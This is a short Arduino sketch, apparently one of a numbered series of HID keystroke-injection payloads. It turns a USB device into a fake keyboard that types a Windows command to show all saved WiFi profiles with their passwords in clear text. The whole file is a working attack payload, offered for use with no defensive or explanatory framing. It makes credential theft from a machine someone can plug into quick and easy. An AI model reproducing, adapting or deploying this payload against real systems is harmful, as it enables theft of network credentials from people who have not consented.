// HID Payload 10: Extract WiFi Passwords
#include "Arduino.h"
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void setup() {
    USB.begin();
    Keyboard.begin();
    delay(2000);
    Keyboard.println("cmd /c netsh wlan show profile name=* key=clear");
}

void loop() {}